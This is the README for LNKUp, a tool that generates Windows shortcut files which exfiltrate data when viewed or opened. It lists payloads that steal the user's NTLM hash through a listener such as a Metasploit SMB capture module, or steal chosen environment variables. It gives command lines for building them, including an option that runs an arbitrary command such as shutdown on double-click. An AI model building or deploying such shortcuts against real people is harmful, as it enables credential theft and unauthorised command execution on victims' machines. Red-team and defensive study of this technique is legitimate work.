# LNKUp
LNK Data exfiltration payload generator
---
This tool will allow you to generate LNK payloads. Upon rendering or being run, they will exfiltrate data.

## Installation
Install requirements using   
`pip install -r requirements.txt`


## Usage

#### Payload types:
* NTLM
	* Steals the user's NTLM hash when rendered.
	* Needs listener server such as this [metasploit module](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb)
	* More on NTLM hashes leaking: [https://dylankatz.com/NTLM-Hashes-Microsoft's-Ancient-Design-Flaw/](https://dylankatz.com/NTLM-Hashes-Microsoft's-Ancient-Design-Flaw/?utm_source=github_lnkup)
	* Example usage:   
	 `lnkup.py --host localhost --type ntlm --output out.lnk`
* Environment
	* Steals the user's environment variables.
	* Examples: %PATH%, %USERNAME%, etc
	* Requires variables to be set using --vars
	* Example usage:   
	 `lnkup.py --host localhost --type environment --vars PATH USERNAME JAVA_HOME --output out.lnk`
#### Extra:
* Use `--execute` to specify a command to run when the shortcut is double clicked
	* Example:   
	  `lnkup.py --host localhost --type ntlm --output out.lnk --execute "shutdown /s"`
